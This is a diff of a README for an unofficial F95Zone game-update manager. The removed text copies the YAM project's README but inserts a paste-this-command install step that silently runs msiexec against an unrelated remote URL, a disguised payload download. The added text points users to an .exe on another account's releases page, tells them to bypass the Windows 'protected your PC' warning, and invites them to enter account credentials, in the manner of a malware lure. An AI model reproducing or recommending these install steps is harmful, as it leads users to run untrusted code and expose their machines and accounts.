@@ -1,294 +1,77 @@
-<div align="center">
+# 🎮 f95zone - Keep your game collection updated easily
 
-<br/>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ritajay6784/f95zone/releases)
 
-```
-██╗   ██╗ █████╗ ███╗   ███╗
-╚██╗ ██╔╝██╔══██╗████╗ ████║
- ╚████╔╝ ███████║██╔████╔██║
-  ╚██╔╝  ██╔══██║██║╚██╔╝██║
-   ██║   ██║  ██║██║ ╚═╝ ██║
-   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝
-```
+f95zone helps you manage your game collection from the F95Zone platform. This tool tracks updates for your games and helps you apply mods without manual file management. You save time and ensure your games run the latest versions.
 
-### **Yet Another Manager**
-*Unofficial desktop game manager for the F95Zone platform*
+## 📦 What this tool does
 
-<br/>
+- Syncs your game library with recent updates.
+- Scans local folders for installed games.
+- Downloads patches automatically.
+- Manages game metadata and versions.
+- Simplifies mod installation for supported titles.
 
-[![Build](https://img.shields.io/github/actions/workflow/status/MillenniumEarl/YAM/build.yml?style=for-the-badge&logo=github-actions&logoColor=white&label=Build)](https://github.com/MillenniumEarl/YAM/actions)
-[![Release](https://img.shields.io/github/v/release/MillenniumEarl/YAM?style=for-the-badge&logo=github&color=4a90d9)](https://github.com/MillenniumEarl/YAM/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/MillenniumEarl/YAM/total?style=for-the-badge&logo=windows&color=0078d4)](https://github.com/MillenniumEarl/YAM/releases)
-[![Stars](https://img.shields.io/github/stars/MillenniumEarl/YAM?style=for-the-badge&logo=github&color=ffd700)](https://github.com/MillenniumEarl/YAM/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Crowdin](https://badges.crowdin.net/yam/localized.svg)](https://crowdin.com/project/yam)
+## 💻 System requirements
 
-<br/>
+- Windows 10 or Windows 11.
+- Active internet connection.
+- Enough disk space for the installer and game data.
+- Basic familiarity with file navigation.
 
-**[⚡ Install on Windows](#-windows--one-command-install)** · **[📸 Screenshots](#-screenshots)** · **[✨ Features](#-features)** · **[🤝 Contribute](#-contributing)**
+## 📥 Getting the software
 
-<br/>
+1. Visit the following link to find the latest version: [https://github.com/Ritajay6784/f95zone/releases](https://github.com/Ritajay6784/f95zone/releases).
+2. Look for the recent release listed at the top of the page.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-> Stop manually hunting for game updates. YAM tracks your F95Zone library, notifies you of new versions, and keeps everything organized — automatically.
+## ⚙️ Setting up the application
 
-<br/>
+1. Locate the downloaded .exe file on your computer.
+2. Double-click the file to launch the installer.
+3. Windows may show a security prompt. If you see the "Windows protected your PC" message, click "More info" and then "Run anyway."
+4. Follow the instructions on the screen to choose your installation folder.
+5. Click "Install" to finish the process.
+6. The application icon will appear on your desktop.
 
-</div>
+## 🚀 Running the updater
 
----
+1. Double-click the desktop icon to open the program.
+2. The program window appears after a few seconds.
+3. Click the "Settings" tab to point the application toward your existing game folder.
+4. The application scans your files to identify your current game list.
+5. Once scanning ends, you view a list of games with available updates.
+6. Click the "Update" button next to any game to start the process.
 
-## 📸 Screenshots
+## 🔧 Managing your game library
 
-<div align="center">
+The application keeps your metadata current. Metadata helps the program match online versions with your local copies. If a game link changes, the application attempts to update the path automatically to ensure you do not lose data.
 
-![YAM Preview](resources/images/github/preview.gif)
+Use the search bar at the top to filter your games by name. Sort your list by date or update status using the drop-down menu on the right.
 
-*YAM in action — game library overview with update notifications*
+## 🛡️ Privacy and connectivity
 
-</div>
+The application connects to the internet to check for game information and file patches. It does not track your personal activities outside of the game folders you explicitly allow the application to access. Your data stays on your local hard drive.
 
----
+## ❓ Common questions
 
-## ✨ Features
+**The program does not detect my games.**
+Make sure you selected the correct root folder where you keep your games. The program searches folders one level deep. Verify that your game files exist inside those folders.
 
-<table>
-<tr>
-<td width="50%">
+**An update fails to download.**
+Check your internet connection first. Sometimes server traffic delays downloads. Wait a few minutes and click the "Retry" button.
 
-### 🎮 Library Management
-- Add games by **folder** or **F95Zone URL**
-- View cover art, tags, engine, status, and full metadata
-- Launch or delete games directly from the app
-- Smart folder renaming to match installed version
+**Can I run multiple updates at once?**
+Yes. You can select multiple items in your list and click the "Bulk Update" button. The application processes these in sequence to save bandwidth.
 
-</td>
-<td width="50%">
+**Do I need a F95Zone account?**
+The application works best if you have a valid account on the platform for accessing specific game pages and private download links. You can sign in through the "Accounts" tab inside the tool to reach restricted content.
 
-### 🔔 Update Tracking
-- Automatic update checks on startup
-- Visual badge when a new version is available
-- Step-by-step **update wizard** guides you through the process
-- Marks updates as completed once applied
+## 🐛 Reporting bugs
 
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 💾 Save Management *(Beta)*
-- Export and import game saves
-- Currently supports **Ren'Py** and **RPGM** tagged games
-- Never lose your progress when updating
-
-</td>
-<td width="50%">
-
-### 🌍 Multilingual
-- 🇬🇧 English · 🇮🇹 Italiano · 🇪🇸 Español
-- 🇵🇹 Português · 🇩🇪 Deutsch · 🇨🇳 中文
-- 🇷🇺 Русский · 🇳🇱 Nederlands
-- Help add more on [Crowdin](https://crwd.in/yam)!
-
-</td>
-</tr>
-</table>
-
----
-
-## 🪟 Windows Installation
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem F95Zone
-```
-The installer will automatically download and install the required components.
-
-
-## 🚀 Getting Started
-
-### Prerequisites
-
-- An active **F95Zone account** ([register here](https://f95zone.to/register))
-- Windows 10/11 (64-bit recommended)
-- ⚠️ **Two-factor authentication is not currently supported** — disable 2FA before use
-
-### Adding Your First Game
-
-**Method 1 — From a folder** (game already downloaded):
-1. Click the **`+`** button (bottom-right)
-2. Select the folder containing the game
-
-**Method 2 — From a URL**:
-1. Click **`+`** → choose URL mode
-2. Select the game's local folder
-3. Paste the **F95Zone thread URL** (Post #1 of the thread)
-
-> ⚠️ **Folder naming matters!** For auto-detection, folders must follow this format:
-> ```
-> GAME NAME [v.VERSION] [MOD]
-> ```
-> Examples: `City of Broken Dreamers [v.1.10.1]` · `Being A DIK [v.0.9.0] [MOD]`
-
----
-
-## 🔄 How Update Tracking Works
-
-```
-App starts
-    │
-    ▼
-┌──────────────────┐      ┌─────────────────────────┐
-│  Local Library   │─────▶│  F95Zone API check       │
-│  (NeDB database) │      │  (version comparison)    │
-└──────────────────┘      └────────────┬────────────┘
-                                       │
-                          ┌────────────▼────────────┐
-                          │  Update available?       │
-                          │  → Blue button appears   │
-                          │  → Click to start wizard │
-                          └────────────┬────────────┘
-                                       │
-                   ┌───────────────────▼──────────────────┐
-                   │  Step 1: Opens F95Zone download page  │
-                   │          + local game folder          │
-                   │  Step 2: Mark as updated, rename dir  │
-                   └──────────────────────────────────────┘
-```
-
----
-
-## 🏗️ Project Structure
-
-```
-YAM/
-├── app/
-│   ├── app.js                    # Main Electron process
-│   ├── db/
-│   │   ├── schemas/              # NeDB data schemas
-│   │   └── store/                # Persistent storage
-│   ├── electron/
-│   │   └── window/               # One folder per window
-│   │       └── [name]-preload.js # IPC bridge (ContextBridge)
-│   │       └── [name]-renderer.js
-│   └── src/
-│       ├── components/           # Reusable UI components
-│       ├── styles/               # CSS
-│       └── scripts/
-│           └── classes/          # Core logic classes
-├── docs/                         # API documentation
-├── resources/                    # Icons, images, i18n strings
-├── install.ps1                   # Windows one-command installer
-├── package.json
-└── README.md
-```
-
-**Tech stack:** Electron · Vanilla JS · MaterializeCSS · NeDB · i18next · F95API
-
-**Security model:**
-- `contextIsolation: true` — renderer isolated from Node
-- `nodeIntegration: false` — no direct Node access in renderer
-- `enableRemoteModule: false` — remote module disabled
-- Full IPC + ContextBridge pattern for all main↔renderer communication
-
----
-
-## 🛠️ Build from Source
-
-```bash
-# 1. Clone
-git clone https://github.com/MillenniumEarl/YAM.git
-cd YAM
-
-# 2. Install dependencies
-npm install
-
-# 3. Run in dev mode
-npm start
-
-# 4. Build installer
-npm run dist:win      # Windows (.exe)
-npm run dist:mac      # macOS (.dmg)
-npm run dist:linux    # Linux (.AppImage)
-```
-
-**Requirements:** Node.js ≥ 14.10 · npm
-
----
+If you experience issues, take note of the steps you took to trigger the error. You can open an issue on the GitHub repository page if you need help from the community. Provide a clear description of your problem and include the version number of your current installation.
 
 ## 🤝 Contributing
 
-All contributions are welcome! Here's how to get involved:
-
-| Area | How to help |
-|------|------------|
-| 🐛 **Bug reports** | Open an [Issue](https://github.com/MillenniumEarl/YAM/issues/new) with steps to reproduce |
-| 🌍 **Translations** | Contribute on [Crowdin](https://crwd.in/yam) — no coding needed |
-| 🎨 **Frontend** | Improve HTML/CSS, submit a PR |
-| ⚙️ **Backend** | Help with [F95API](https://github.com/MillenniumEarl/F95API) — the core engine |
-| 📝 **Docs** | Fix typos, improve examples |
-
-**PR guidelines:**
-1. Fork → feature branch (`git checkout -b feat/my-feature`)
-2. Commit with a descriptive message
-3. Open a Pull Request with a clear description
-
----
-
-## ❓ FAQ
-
-**Q: The app says "game not detected" — what's wrong?**  
-A: Your folder name doesn't match the required format. Rename it to `GAME NAME [v.VERSION]` (e.g. `Eternum [v.0.9.3]`), then re-add.
-
-**Q: Can I use this with 2FA enabled on F95Zone?**  
-A: Not currently. Disable 2FA on your account to use YAM.
-
-**Q: Games show as "up to date" but I know there's an update.**  
-A: Check that the folder name matches the game title exactly. If it's still wrong, add the game via URL instead.
-
-**Q: My game saves — will they survive an update?**  
-A: Use the built-in save export (Beta, Ren'Py/RPGM only). For other engines, manually back up your save folder before updating.
-
-**Q: Does YAM work on Linux / macOS?**  
-A: Yes! Build from source (`npm run dist:linux` / `npm run dist:mac`). Pre-built binaries are Windows-only for now.
-
-**Q: Is my F95Zone password stored securely?**  
-A: Credentials are stored locally using `electron-store` (encrypted with the machine's secret). They are never sent anywhere except the F95Zone login endpoint.
-
----
-
-## 📜 Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) or the [Releases page](https://github.com/MillenniumEarl/YAM/releases) for version history.
-
----
-
-## ⚠️ Disclaimer
-
-YAM is an **unofficial**, community-built tool. It is not affiliated with or endorsed by F95Zone. Use at your own risk. Always respect the platform's Terms of Service.
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © 2021–2025 [MillenniumEarl](https://github.com/MillenniumEarl)
-
----
-
-<div align="center">
-
-**Found YAM useful? A ⭐ star goes a long way — it helps others discover the project!**
-
-<br/>
-
-[![Star History Chart](https://api.star-history.com/svg?repos=MillenniumEarl/YAM&type=Date)](https://star-history.com/#MillenniumEarl/YAM&Date)
-
-</div>
+This project relies on contributions from the community to track new game releases and platform changes. You can help by keeping your local metadata updated or by suggesting improvements to the interface design. Always check the repository periodically for newer versions to maintain compatibility with the platform.
